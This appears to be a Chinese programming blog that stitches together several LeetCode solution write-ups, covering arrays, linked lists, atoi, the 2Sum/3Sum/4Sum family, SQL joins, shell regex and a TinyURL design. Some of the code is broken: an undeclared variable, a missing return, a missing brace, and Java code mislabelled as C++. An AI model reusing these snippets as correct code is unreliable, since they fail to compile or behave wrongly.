            if (cur.val == cur.next.val) {
                cur.next = cur.next.next;
            }
            else cur = cur.next;
        }
        return head;
    }
}

c语言：
struct ListNode* deleteDuplicates(struct ListNode* head) 
{
    if (head) {
    struct ListNode *p = head;
    while (p->next) {
        if (p->val != p->next->val) {
            p = p->next;
        }
        else {
            struct ListNode *tmp = p->next;
            p->next = p->next->next;
            free(tmp);//这块在实际代码中，非常有必要
        }
    }
}

return head;


}
简洁的python解决方案：
class Solution:
    # @param head, a ListNode
    # @return a ListNode
    def deleteDuplicates(self, head):
        node = head
        while node:
            while node.next and node.next.val == node.val:
                node.next = node.next.next

            node = node.next

        return head
 






 
 
Given two sorted integer arrays nums1 and nums2, merge nums2 intonums1 as one sorted array.
Note:
You may assume that nums1 has enough space (size that is greater or equal tom +
n) to hold additional elements from nums2. The number of elements initialized innums1 and
nums2 are m and n respectively.
 
测试用例：
 


Runtime Error Message:
Last executed input:







Input:[1,2,3,0,0,0], 3, [2,5,6], 3
Output:[1,2,3,5,6]
Expected:[1,2,2,3,5,6]


 
错误的解决方案：
 
class Solution {
public:
    void merge(vector<int>& nums1, int m, vector<int>& nums2, int n) 
    {
    set<int> result;
    for(int i = 0;i<m;i++)
    {
        result.insert(nums1[i]);
    }
    for(int i = 0;i<n;i++)
    {
        result.insert(nums2[i]);
    }
    nums1.clear();
    set<int>::iterator iter = result.begin();
    for(;iter!=result.end();iter++)
    {
        nums1.push_back(*iter);
    }
    }
};

 
我的解决方案：上面就是相同 的元素没装进来，换成multiset就行了
class Solution {
public:
    void merge(vector<int>& nums1, int m, vector<int>& nums2, int n) 
    {
    multiset<int> result;
    for(int i = 0;i<m;i++)
    {
        result.insert(nums1[i]);
    }
    for(int i = 0;i<n;i++)
    {
        result.insert(nums2[i]);
    }
    nums1.clear();
    set<int>::iterator iter = result.begin();
    for(;iter!=result.end();iter++)
    {
        nums1.push_back(*iter);
    }
    }
};

 简短的解决方案：
class Solution {
public:
    void merge(int A[], int m, int B[], int n) {
        int k = m + n;
        while (k-- > 0)
            A[k] = (n == 0 || (m > 0 && A[m-1] > B[n-1])) ?  A[--m] : B[--n];
    }
};


可读性较好：
class Solution {
public:
    void merge(int A[], int m, int B[], int n) {
        int i=m-1;
        int j=n-1;
        int k = m+n-1;
        while(i >=0 && j>=0)
        {
            if(A[i] > B[j])
                A[k--] = A[i--];
            else
                A[k--] = B[j--];
        }
        while(j>=0)
            A[k--] = B[j--];
    }
};


python解决方案：
class Solution:
# @param A  a list of integers
# @param m  an integer, length of A
# @param B  a list of integers
# @param n  an integer, length of B
# @return nothing(void)
def merge(self, A, m, B, n):
    x=A[0:m]
    y=B[0:n]
    x.extend(y)
    x.sort()
    A[0:m+n]=x


python解决方案2：thats why we love python
def merge(self, A, m, B, n):
        A[m:] = B[:n]
        A.sort()


 
 






String to Integer (atoi)Total Accepted:52232
Total Submissions:401038

My Submissions 





Implement atoi to convert a string to an integer.
Hint: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.
Notes: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.
Update (2015-02-10):
The signature of the C++ function had been updated. If you still see your function signature accepts aconst char * argument, please click the reload button
to reset your code definition. 
spoilers alert... click to show requirements for atoi.
Requirements for atoi:
The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and
 interprets them as a numerical value.
The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.
If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.
If no valid conversion could be performed, a zero value is returned. If the correct value is out of the range of representable values, INT_MAX (2147483647) or INT_MIN (-2147483648) is returned.




 
c++ 解决方案：
 
class Solution {
public:
//consider a case: "  +-++--3"
    int myAtoi(string str) 
    {
        long result = 0;
    int indicator = 1;
    for(int i = 0; i<str.size();)
    {
        i = str.find_first_not_of(' ');
        if(str[i] == '-' || str[i] == '+')
            indicator = (str[i++] == '-')? -1 : 1;
        while('0'<= str[i] && str[i] <= '9') 
        {
            result = result*10 + (str[i++]-'0');
            if(result*indicator >= INT_MAX) return INT_MAX;
            if(result*indicator <= INT_MIN) return INT_MIN;                
        }
        return result*indicator;
    }

   
    }
};

 
 
python解决方案：
class Solution:
    # @return an integer
    def atoi(self, str):
        string = str
        buf = ''
        # our list
        dg_list = ['0','1','2','3','4','5','6','7','8','9']
        dg_signal = ['-','+']

        signal = ''

        #there is no +/- and 0-9 at first
        no_signal = True
        no_dig = True
        #strip whitespace
        for i in string.strip():

            #if i in dg_signal judge:
            #1:it is the first -/+ and signal = -/+, then set no_signal = False . Start to next i
            #2:it it the second -/+ So it is wrong,we return 0
            if i in dg_signal:
                if no_signal is False:
                    return 0
                if no_signal:
                    signal += i
                    no_signal=False
                    continue
            #if i is 0-9, we save it to buf
            if i in dg_list:
                buf+=i
            #but if there is a -/+, and the next char is not dig, eg:+a   here we break.     
            elif no_signal is False:
                break
            else:
                #if it is not in dg_list and dg_signal,and it is also has something eg:+322a99  when i = a  and buf = +322. We jsut break a and continue 
                #add 99 to buf
                if len(buf)>0:
                    break
                #if len(buf)<0.  eg: -a. We return as the sys tips
                if len(buf)<=0:
                    return 0


        #add +/-
        if len(buf)>0:
            buf=signal+buf

        if len(buf)<=0:
            return 0

        f_result = int(buf)

        if f_result >2147483647:
            return 2147483647
        if f_result<-2147483648:
            return -2147483648

        return f_result


 
 
 
python解决方案2：
 
class Solution:
# @return an integer
def atoi(self, str):
    str = str.strip()
    str = re.findall('(^[\+\-0]*\d+)\D*', str)

    try:
        result = int(''.join(str))
        MAX_INT = 2147483647
        MIN_INT = -2147483648
        if result > MAX_INT > 0:
            return MAX_INT
        elif result < MIN_INT < 0:
            return MIN_INT
        else:
            return result
    except:
        return 0


 
 
python解决方案3：
class Solution:
# @return an integer
def atoi(self, str):
    str = str.strip()
    if len(str) == 0: return 0
    r, i, l, s = 0, 0, 0, ''  
    if str[0] in '+-':  
        s = str[0]
        i = 1
    for i in xrange(i, len(str)):
        if '0' <= str[i] <= '9':
            r = r*10 + ord(str[i]) - ord('0')
            l += 1
        else:
            break
    if r == 0 and (s or l == 0):
        return 0
    elif r > 0 and s == '-':
        r *= -1
    if r > 2147483647:
        r = 2147483647
    if r < -2147483648:
        r = -2147483648
    return r


 
 









Determine whether an integer is a palindrome. Do this without extra space.
click to show spoilers.
Some hints:  
Could negative integers be palindromes? (ie, -1)
If you are thinking of converting the integer to string, note the restriction of using extra space.
You could also try reversing an integer. However, if you have solved the problem “Reverse Integer”, you know that the reversed integer might overflow. How would you handle such case?
There is a more generic way of solving this problem.
非常简洁的c++解决方案： 
对于回文数只比较一半
public boolean isPalindrome1(int x) {
    if (x == 0) return true;
    // in leetcode, negative numbers and numbers with ending zeros
    // are not palindrome
    if (x < 0 || x % 10 == 0)
        return false;

    // reverse half of the number
    // the exit condition is y >= x
    // so that overflow is avoided.
    int y = 0;
    while (y < x) {
        y = y * 10 + (x % 10);
        if (x == y)  // to check numbers with odd digits
            return true;
        x /= 10;
    }
    return x == y; // to check numbers with even digits
}

python这个解法应该是前后分别对比：

class Solution:
    # @param x, an integer
    # @return a boolean
    def isPalindrome(self, x):
        if x < 0:
            return False

        ranger = 1
        while x / ranger >= 10:
            ranger *= 10

        while x:
            left = x / ranger
            right = x % 10
            if left != right:
                return False

            x = (x % ranger) / 10
            ranger /= 100

        return True


python字符串的解法：
class Solution:
    # @param {integer} x
    # @return {boolean}
    def isPalindrome(self, x):
        return str(x)==str(x)[::-1]
 









july 大神有个程序员编程艺术系列，第五章《寻找和为定值的多个数》,现在我们站在大牛的肩膀上，对leetcode上n个数求和的系列问题做个阶段性总结。

1.leetcode No.1 2sum
Given an array of integers, return indices of the two numbers such that they add up to a specific target. 
You may assume that each input would have exactly one solution, and you may not use the same element twice. 
Example: 
Given nums = [2, 7, 11, 15], target = 9,
Because nums[0] + nums[1] = 2 + 7 = 9, 
return [0, 1].
http://blog.csdn.net/gatieme/article/details/50596965
1.1 双向扫描
时间复杂度O（N）,空间复杂度O(N)
暴力穷举的办法我们就不说了任选两个数判断和是否为输入即可 
a[i]在序列中，如果a[i]+a[k]=sum的话，那么sum-a[i]（a[k]）也必然在序列中，举个例子，如下：
原始序列：1、2、4、7、11、15  
用输入数字15 减一下各个数，得到对应的 
序列为： 
对应序列：14、13、11、8、4、0
第一个数组以一指针i从数组最左端开始向右扫描，第二个数组以一指针j 从数组最右端开始向左扫描，如果下面出现了和上面一样的数，即a[*i]=a[*j]，就找出这俩个数来了。如上，i，j最终在第一个，和第二个序列中找到了相同的数4 和11，所以符合条件的两个数，即为4+11=15。
 
然后用两个指针i，j，各自指向数组的首尾 
两端，令i=0，j=n-1，然后i++，j–，逐次判断a[i]+a[j]?=sum，如果某一刻a[i]+a[j]>sum， 
则要想办法让sum 的值减小，所以此刻i 不动，j–，如果某一刻a[i]+a[j]
// leetcode1-2Sum.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
//进阶解法–基于排序O(nlogn)


#include <stdlib.h>
#include <malloc.h>

#define DEBUG

///////////////////////////////////////////////////////////////////////////
///
///  快速排序--QuickSort
///  http://www.cnblogs.com/RootJie/archive/2012/02/13/2349649.html
///
///////////////////////////////////////////////////////////////////////////


#include <stdio.h>
#include <time.h>

#define MAX_SIZE 20000

#define SWAP(x, y) {int t=x; x=y; y=t;}

void QuickSort(int *array, int left, int right);
int Partition(int *array, int left, int right);

int position[MAX_SIZE]; //  用于存储位置信息

void InitPosion(int *position, int length)
{
    for (int pos = 0; pos < length; pos++)
    {
        position[pos] = pos + 1;
    }
}

int Partition(int *array, int left, int right)
{
    int pivot = array[left];

    while (left < right)
    {
        while (left < right && array[right] >= pivot)
        {
            --right;
        }
        SWAP(array[left], array[right]);
        SWAP(position[left], position[right]);

        while (left < right && array[left] <= pivot)
        {
            ++left;
        }
        SWAP(array[right], array[left]);
        SWAP(position[left], position[right]);

    }

    return left;
}

void QuickSort(int *array, int left, int right)
{
    int pivot;

    if (left < right)
    {
        pivot = Partition(array, left, right);

        QuickSort(array, left, pivot - 1);
        QuickSort(array, pivot + 1, right);
    }
}



int cmp(const void *left, const void *right)
{
    int *left_num = (int *)left;
    int *right_num = (int *)right;

    return (*left_num - *right_num);

    //qsort(nums, numsSize, sizeof(nums[0]), cmp);
}


int* twoSum(int* nums,      /*  the pointer which point to the array  */
    int numsSize,   /*  the size of the array  */
    int target)     /*  the sum of the two num  */
{
    //qsort(nums, numsSize, sizeof(nums[0]), cmp);
    InitPosion(position, numsSize);

#ifdef DEBUG   
    printf("Before Quick Sort : \n");
    printf("Array    : ");
    for (int pos = 0; pos < numsSize; pos++)
    {
        printf("%3d", nums[pos]);
    }
    printf("\n");
    printf("Position : ");
    for (int pos = 0; pos < numsSize; pos++)
    {
        printf("%3d", position[pos]);
    }
    printf("\n");
#endif  

    QuickSort(nums, 0, numsSize - 1);

#ifdef DEBUG   

    printf("After Quick Sort : \n");
    printf("Array    : ");
    for (int pos = 0; pos < numsSize; pos++)
    {
        printf("%3d", nums[pos]);
    }
    printf("\n");
    printf("Position : ");

    for (int pos = 0; pos < numsSize; pos++)
    {
        printf("%3d", position[pos]);
    }
    printf("\n");
#endif  


    int *answer = (int *)malloc(sizeof(int) * 2);

    int left = 0, right = numsSize - 1, sum;
    while (left < right)
    {
        sum = nums[left] + nums[right];

#ifdef DEBUG
        printf("[%d, %d], %d + %d = %d\n",
            left, right,
            nums[left], nums[right], sum);
#endif  

        if (sum == target)
        {
#ifdef DEBUG
            printf("[%d, %d], %d + %d = %d\n",
                left, right,
                nums[left], nums[right], target);
#endif
            break;
        }
        else if (sum < target)
        {
#ifdef DEBUG
            printf("[%d, %d], %d + %d = %d\n",
                left, right,
                nums[left], nums[right], target);
#endif
            left++;
        }
        else if (sum > target)
        {
#ifdef DEBUG
            printf("[%d, %d], %d + %d = %d\n",
                left, right,
                nums[left], nums[right], target);

#endif
            right--;
        }
    }
    if (position[left] < position[right])
    {
        answer[0] = position[left];
        answer[1] = position[right];
    }
    else
    {
        answer[0] = position[right];
        answer[1] = position[left];
    }

    return answer;
}

#ifdef DEBUG

int main()
{
    int nums[5] = { -1, -2, -3, -4, -5 };
    int *answer = NULL;
    answer = twoSum(nums, 5, -8);
    printf("[%d, %d]\n", answer[0], answer[1]);
}
#endif




1.2 hash
class Solution:
    def twoSum(self, num, target):
        """
        :type nums: List[int]
        :type target: int
        :rtype: List[int]
        """
        # python中字典dict类似于map的
        dict = {}

        for i in range(len(num)):   #  对于每一个num

            # 判断target - num[i]在不在在字典中
            if dict.get(target - num[i], None) == None: #如果不在

                dict[num[i]] = i   # 将该数存入字典中

            else:
                # 否则这两个数的和为target, 则返回
                return (dict[target - num[i]] , i )

2. leetcode No.15 3Sum
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.
Note: The solution set must not contain duplicate triplets.
For example, given array S = [-1, 0, 1, 2, -1, -4],
A solution set is: 
[ 
  [-1, 0, 1], 
  [-1, -1, 2] 
]
思路： 
- 1，先按照由小到大把数组排序 
- 2，循环取第i位，数值a[i],  后面剩余的由旁边向中间扫描，看是否符合 a[m]+a[n] == -a[i]，如果a[m]+a[n]>-a[i]，则向右边移动m，如果小于则向左边移动n 
典型c++解法如下：
class Solution
{
public:
    vector<vector<int>> threeSum(vector<int>& nums) 
    {
    vector<vector<int> >result;

    std::sort(nums.begin(), nums.end());

    for (unsigned int i = 0; i < nums.size(); i++)
    {
        int target = -nums[i];
        int front = i + 1;
        int back = nums.size() - 1;

        while (front < back)
        {
            int sum = nums[front] + nums[back];

            if (sum < target)
                front++;

            else if (sum > target)
                back--;

            else
            {
                vector<int> triplet(3, 0);
                triplet[0] = nums[i];
                triplet[1] = nums[front];
                triplet[2] = nums[back];
                result.push_back(triplet);

                //处理有两个同样的数的情况
                while (front < back && nums[front] == triplet[1])front++;
                while (front < back && nums[back] == triplet[2])back--;

            }

        }
        //处理有两个同样的数的情况
        while (i + 1 < nums.size() && nums[i + 1] == nums[i]) i++;

    }
    return result;
    }
};
 3. leetcode No.16 3Sum Closest
Given an array S of n integers, find three integers in S such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution.
For example, given array S = {-1 2 1 -4}, and target = 1.

The sum that is closest to the target is 2. (-1 + 2 + 1 = 2).

class Solution
{
public:
    int threeSumClosest(vector<int>& nums,int target)
    {
        sort(nums.begin(),nums.end());
        int result = nums[0]+nums[1]+nums[2];

        for(int i =0;i<nums.size()-2;i++)
            {
                int j = i+1,k=nums.size()-1;
                while(j<k)
                {
                int num = nums[i] + nums[j] + nums[k];
                if(abs(num - target) < abs(res - target)) res = num;
                if(num < target) j++;
                else k--;
                }
            }
            return result;
        }
};
 4. leetcode No.18 4Sum
Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target.
Note: The solution set must not contain duplicate quadruplets.
For example, given array S = [1, 0, -1, 0, -2, 2], and target = 0.
A solution set is: 
[ 
  [-1,  0, 0, 1], 
  [-2, -1, 1, 2], 
  [-2,  0, 0, 2] 
]
// O(n^3)
class Solution {
public:
    vector<vector<int> > fourSum(vector<int> &nums, int target) {
        set<vector<int> > res;
        sort(nums.begin(), nums.end());
        for (int i = 0; i < int(nums.size() - 3); ++i) {
            for (int j = i + 1; j < int(nums.size() - 2); ++j) {
                int left = j + 1, right = nums.size() - 1;
                while (left < right) {
                    int sum = nums[i] + nums[j] + nums[left] + nums[right];
                    if (sum == target) {
                        vector<int> out;
                        out.push_back(nums[i]);
                        out.push_back(nums[j]);
                        out.push_back(nums[left]);
                        out.push_back(nums[right]);
                        res.insert(out);
                        ++left; --right;
                    } else if (sum < target) ++left;
                    else --right;
                }
            }
        }
        return vector<vector<int> > (res.begin(), res.end());
    }
};
 5. 举一反三 n Sum
https://www.jianshu.com/p/3d1791cfba53 
http://blog.csdn.net/XingKong_678/article/details/50894322 
http://blog.csdn.net/yuanwei1314/article/details/42963229
输入两个整数n 和m，从数列1，2，3…….n 中随意取几个数, 
使其和等于m ,要求将其中所有的可能组合列出来。
// 21 题递归方法
//copyright@ July && yansha
//July、yansha，updated。
#include<list>
#include<iostream>
using namespace std;
list<int>list1;

void find_factor(int sum, int n)
{
    // 递归出口
    if(n <= 0 || sum <= 0)
    return;
    // 输出找到的结果
    if(sum == n)
    {
    // 反转list
    list1.reverse();

    for(list<int>::iterator iter = list1.begin(); iter != list1.end(); iter++)
        cout << *iter << " + ";
        cout << n << endl;

    list1.reverse();

    list1.push_front(n); //典型的01 背包问题
    find_factor(sum-n, n-1); //放n，n-1 个数填满sum-n
    list1.pop_front();
    find_factor(sum, n-1); //不放n，n-1 个数填满sum
}

int main()
{
    int sum, n;
    cout << "请输入你要等于多少的数值sum:" << endl;
    cin >> sum;
    cout << "请输入你要从1.....n 数列中取值的n：" << endl;
    cin >> n;
    cout << "所有可能的序列，如下：" << endl;

    find_factor(sum,n);
    return 0;
} 









leetcode 主要是一个针对北美的coder人群找工作的代码练习网站，我在2015年初次接触这个网站的时候，总共只有200多道题目，是一个类似acm 的a题网站。这些年变化越来越大，主要是因为找工作当然是多样化的考核过程，leetcode 也逐渐与时俱进，推出了下面几个类别的练习，今天我们随便挑几个练习一下：

175. Combine Two Tables —SQL
Table: Person



Column Name
Type



PersonId
int


FirstName
varchar


LastName
varchar


PersonId is the primary key column for this table.
Table: Address



Column Name
Type



AddressId
int


PersonId
int


City
varchar


State
varchar


AddressId is the primary key column for this table.

Write a SQL query for a report that provides the following information for each person in the Person table, regardless if there is an address for each of those people: 
FirstName, LastName, City, State
# Write your MySQL query statement below

#
/** 这是个内链接
select t1.FirstName,t1.LastName ,t2.City,t2.State from 

(select * from Person as t1),
（select * from Address as t2),

where t1.PersonId=t2.PersonId

*/

select FirstName,LastName,City,State  from Person left join Address on  Person.PersonId=Address.PersonId
数据库到底有多少种链接呢？
1、内联接（典型的联接运算，使用像 =  或 <> 之类的比较运算符）。包括相等联接和自然联接。 
内联接使用比较运算符根据每个表共有的列的值匹配两个表中的行。
2、外联接。外联接可以是左向外联接、右向外联接或完整外部联接。 
在 FROM子句中指定外联接时，可以由下列几组关键字中的一组指定： 
1）LEFT  JOIN或LEFT OUTER JOIN 
左向外联接的结果集包括  LEFT OUTER子句中指定的左表的所有行，而不仅仅是联接列所匹配的行。如果左表的某行在右表中没有匹配行，则在相关联的结果集行中右表的所有选择列表列均为空值。 
2）RIGHT  JOIN 或 RIGHT  OUTER  JOIN 
右向外联接是左向外联接的反向联接。将返回右表的所有行。如果右表的某行在左表中没有匹配行，则将为左表返回空值。 
3）FULL  JOIN 或 FULL OUTER JOIN 
完整外部联接返回左表和右表中的所有行。当某行在另一个表中没有匹配行时，则另一个表的选择列表列包含空值。如果表之间有匹配行，则整个结果集行包含基表的数据值。   
3、交叉联接 
交叉联接返回左表中的所有行，左表中的每一行与右表中的所有行组合。交叉联接也称作笛卡尔积。 
FROM 子句中的表或视图可通过内联接或完整外部联接按任意顺序指定；但是，用左或右向外联接指定表或视图时，表或视图的顺序很重要。有关使用左或右向外联接排列表的更多信息，请参见使用外联接。

多表查询分为 内、外连接
外连接分为左连接（left join 或left outer join）、右连接（right join 或者 right outer join）、和完整外部连接 （full join 或者 full outer join）
左连接（left join 或 left outer join）的结果就是left join子句中的左表的所有行，而不仅仅是链接列所匹配的行，如果左表中的某行在右表中没有匹配，则在相关联的结果行中右表的所有选择列均为空值（NULL）
SQL语法　 
    select * from table1 left join table2 on table1.条件列名 = table2.条件列名；
注释： 显示的就是table1中的所有列和能匹配的列 
右连接（right join 或 right outer join ）在这里不做多说这左连接很象但是是相反的，只说一下语法 
select *from table1 right join table2 on table1. 条件列= table2.条件列 
完全外部连接（full join 或 full outer join） 
显示左右表中的所有行，当某一个表中没有匹配的行时，则另一个表的选择列表列包含空值（NULL）如果有则显示全部数据 
SQL语法： 
select *from table1 full join table2 on table1.条件列名= table2.条件列名
内连接： 
概念：内连接就是用比较运算符比较要用连接列的值的连接 
内连接（join 或者inner join ） 
SQL语法： 
select *fron table1 join table2 on table1.条件列名 = table2.条件列名 
返回符合匹配条件的两表列 
等价于： 
select A* ,B* from table1 A ,table2 B where A.条件列名 =B.条件列名 
select *form table1 cross join table2 where table1.条件列名 = table2.条件列名（注： Cross join 后面不能跟on 只能用where） 
交叉连接（完全）
概念：没有用where子句的交叉连接将产生连接所涉及的笛卡尔积第一个表的行数乘以第二个表的行数等于笛卡尔积和结果集的大小 
交叉连接： Cross join（不带条件where，如果带返回或显示的是匹配的行数）
SQL语法： 
select *from table1 cross join table2 
如果有条件（where） 
select * from table1 cross join table2 where table1. 条件列名= table2.条件列名 
等价于
select *from table1,table2 (不带where)

193. Valid Phone Numbers — shell
Given a text file file.txt that contains list of phone numbers (one per line), write a one liner bash script to print all valid phone numbers.
You may assume that a valid phone number must appear in one of the following two formats: (xxx) xxx-xxxx or xxx-xxx-xxxx. (x means a digit)
You may also assume each line in the text file must not contain leading or trailing white spaces.
For example, assume that file.txt has the following content:
987-123-4567
123 456 7890
(123) 456-7890

Your script should output the following valid phone numbers:
987-123-4567
(123) 456-7890

三种解决方案：
Using grep
在CentOS下面，grep -E主要是用来支持扩展正则表达式，比如|、&这些符号，用于grep多条件查询，并非是使用标准正则表达式。在shell下面man grep看了下，加上-P（使用Perl的正则引擎）即可过滤出目标数据.
grep -P '^(\d{3}-|\(\d{3}\) )\d{3}-\d{4}$' file.txt
Using sed:
sed 是一种在线编辑器，它一次处理一行内容。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。Sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。
sed使用参数
[root@www ~]# sed [-nefr] [动作]

选项与参数： 
    -n ：使用安静(silent)模式。在一般 sed 的用法中，所有来自 STDIN 的数据一般都会被列出到终端上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。 
    -e ：直接在命令列模式上进行 sed 的动作编辑； 
    -f ：直接将 sed 的动作写在一个文件内， -f filename 则可以运行 filename 内的 sed 动作； 
    -r ：sed 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法) 
    -i ：直接修改读取的文件内容，而不是输出到终端。
动作说明： [n1[,n2]]function

n1, n2 ：不见得会存在，一般代表『选择进行动作的行数』，举例来说，如果我的动作是需要在 10 到 20 行之间进行的，则『 10,20[动作行为] 』
function：

a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～ 
  c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！ 
  d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚； 
  i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)； 
  p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～ 
  s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！

sed -n -r '/^([0-9]{3}-|\([0-9]{3}\) )[0-9]{3}-[0-9]{4}$/p' file.txt
Using awk:
简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理 
使用方法
awk '{pattern + action}' {filenames}
尽管操作可能会很复杂，但语法总是这样，其中 pattern 表示 AWK 在数据中查找的内容，而 action 是在找到匹配内容时所执行的一系列命令。花括号（{}）不需要在程序中始终出现，但它们用于根据特定的模式对一系列指令进行分组。 pattern就是要表示的正则表达式，用斜杠括起来。
awk语言的最基本功能是在文件或者字符串中基于指定规则浏览和抽取信息，awk抽取信息后，才能进行其他文本操作。完整的awk脚本通常用来格式化文本文件中的信息。
通常，awk是以文件的一行为处理单位的。awk每接收文件的一行，然后执行相应的命令，来处理文本。
awk '/^([0-9]{3}-|\([0-9]{3}\) )[0-9]{3}-[0-9]{4}$/' file.txt

或者使用：
grep -e '\(^[0-9]\{3\}-[0-9]\{3\}-[0-9]\{4\}$\)' -e '\(^([0-9]\{3\})[ ]\{1\}[0-9]\{3\}-\([0-9]\{4\}\)$\)'  file.txt

In Bash, we use \ to escape next one trailing character;
^ is used to denote the beginning of a line 
$ is used to denote the end of a line
{M} is used to denote to match exactly M times of the previous occurence/regex 
(…) is used to group pattern/regex together
Back to this problem: 
it requires us to match two patterns, for better readability, I used -e and separate the two patterns into two regexes, the first one matches this case: xxx-xxx-xxxx and the second one matches this case: (xxx) xxx-xxxx
Please vote this post up if you find it helpful for your understanding!

534. Design TinyURL — system design
https://segmentfault.com/a/1190000006140476

Note: For the coding companion problem, please see: Encode and Decode TinyURL. 
  How would you design a URL shortening service that is similar to TinyURL?

Background:

TinyURL is a URL shortening service where you enter a URL such as https://leetcode.com/problems/design-tinyurl and it returns a short URL such as http://tinyurl.com/4e9iAk.

Requirements:

For instance, “http://tinyurl.com/4e9iAk” is the tiny url for the page “https://leetcode.com/problems/design-tinyurl“. The identifier (the highlighted part) can be any string with 6 alphanumeric characters containing 0-9, a-z, A-Z. 
  Each shortened URL must be unique; that is, no two different URLs can be shortened to the same URL. 
  Note about Questions: 
  Below are just a small subset of questions to get you started. In real world, there could be many follow ups and questions possible and the discussion is open-ended (No one true or correct way to solve a problem). If you have more ideas or questions, please ask in Discuss and we may compile it here!

Questions: 
1. How many unique identifiers possible? Will you run out of unique URLs? 
2. Should the identifier be increment or not? Which is easier to design? Pros and cons? 
3. Mapping an identifier to an URL and its reversal - Does this problem ring a bell to you? 
4. How do you store the URLs? Does a simple flat file database work? 
5. What is the bottleneck of the system? Is it read-heavy or write-heavy? 
6. Estimate the maximum number of URLs a single machine can store. 
7. Estimate the maximum number of queries per second (QPS) for decoding a shortened URL in a single machine. 
8. How would you scale the service? For example, a viral link which is shared in social media could result in a peak QPS at a moment’s notice. 
9. How could you handle redundancy? i,e, if a server is down, how could you ensure the service is still operational? 
10. Keep URLs forever or prune, pros/cons? How we do pruning? (Contributed by @alex_svetkin) 
11. What API would you provide to a third-party developer? (Contributed by @alex_svetkin) 
12. If you can enable caching, what would you cache and what’s the expiry time? (Contributed by @Humandroid)
public class URLService {
    HashMap<String, Integer> ltos;
    HashMap<Integer, String> stol;
    static int COUNTER;
    String elements;
    URLService() {
        ltos = new HashMap<String, Integer>();
        stol = new HashMap<Integer, String>();
        COUNTER = 1;
        elements = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    }
    public String longToShort(String url) {
        String shorturl = base10ToBase62(COUNTER);
        ltos.put(url, COUNTER);
        stol.put(COUNTER, url);
        COUNTER++;
        return "http://tiny.url/" + shorturl;
    }
    public String shortToLong(String url) {
        url = url.substring("http://tiny.url/".length());
        int n = base62ToBase10(url);
        return stol.get(n);
    }

    public int base62ToBase10(String s) {
        int n = 0;
        for (int i = 0; i < s.length(); i++) {
            n = n * 62 + convert(s.charAt(i));
        }
        return n;

    }
    public int convert(char c) {
        if (c >= '0' && c <= '9')
            return c - '0';
        if (c >= 'a' && c <= 'z') {
            return c - 'a' + 10;
        }
        if (c >= 'A' && c <= 'Z') {
            return c - 'A' + 36;
        }
        return -1;
    }
    public String base10ToBase62(int n) {
        StringBuilder sb = new StringBuilder();
        while (n != 0) {
            sb.insert(0, elements.charAt(n % 62));
            n /= 62;
        }
        while (sb.length() != 6) {
            sb.insert(0, '0');
        }
        return sb.toString();
    }
} 








Given numRows, generate the first numRows of Pascal's triangle.
For example, given numRows = 5,
Return 
[
     [1],
    [1,1],
   [1,2,1],
  [1,3,3,1],
 [1,4,6,4,1]
]


解决方案：

vector<vector<int>> generate(int numRows) {
         vector<vector<int>> res = {};
        for (int i = 0; i < numRows; i++) {
            res.push_back(vector<int>(i + 1, 1));
            for(int j = 1; j < i; j++) {
                res[i][j] = (res[i - 1][j] + res[i - 1][j - 1]);
            }
        }
        return res;

    }


Pascal's Triangle II 
Total Accepted: 46342 
Total Submissions: 157260                                   





Given an index k, return the kth row of the Pascal's triangle.
For example, given k = 3,
Return [1,3,3,1]. 
Note:
Could you optimize your algorithm to use only O(k) extra space?


我的解决方案：
从没一行的倒数第二个算起，往前面逆推：

 vector<int> getRow(int rowIndex) 
    {
        vector<int> result(rowIndex + 1, 1);
        
        for(int i = 1; i <= rowIndex; ++i)
        {
            for(int j = i - 1; j > 0; --j)
            {
                result[j] = result[j] + result[j - 1];
            }
        }
        
        return result;
    }


递归的解决方案：

vector<int> getRow(int rowIndex) {
    vector<int> result;

    if (rowIndex == 0) {
        result.push_back(1);

        return result;
    } else {
        vector<int> vec = getRow(rowIndex - 1);
        result.push_back(1);
        for (size_t i = 0; i < vec.size() - 1; i++) {
            result.push_back(vec[i] + vec[i+1]);
        }
        result.push_back(1);
    }
}



python 解决方案：
class Solution:
# @param {integer} rowIndex
# @return {integer[]}
def getRow(self, rowIndex):
    row = [1]
    for i in range(1, rowIndex+1):
        row = list(map(lambda x,y: x+y, [0]+row, row + [0]))
    return row







#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_SIZE 1024

int main()
{
    FILE *fstream = NULL;
    int error=0;
    char buff[MAX_SIZE]={0};

    if(NULL == (fstream=popen("ls -r","w")))//这个应该是写方式的管道
    {
        fprintf(stderr,"execute command failed:%s",strerror(error));
        return -1;
    }

    if(NULL != fgets(buff,sizeof(buff),fstream))
    {
        printf("%s",buff);
    }
     else
     {
         pclose(fstream);
         return -1;
     }
     pclose(fstream);
